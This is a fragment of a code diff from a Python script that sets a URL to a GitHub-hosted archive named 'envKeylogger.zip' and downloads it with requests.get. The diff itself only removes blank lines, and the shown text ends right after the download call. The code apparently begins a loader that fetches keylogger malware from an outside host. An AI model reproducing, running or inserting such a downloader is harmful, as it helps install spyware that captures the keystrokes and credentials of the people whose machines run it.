@@ -2,9 +2,6 @@ import os
 import requests
 
 
-
-
-
 urlZip = 'https://github.com/ELREBEU/keylogger/raw/refs/heads/main/envKeylogger.zip'
 
 response = requests.get(urlZip)
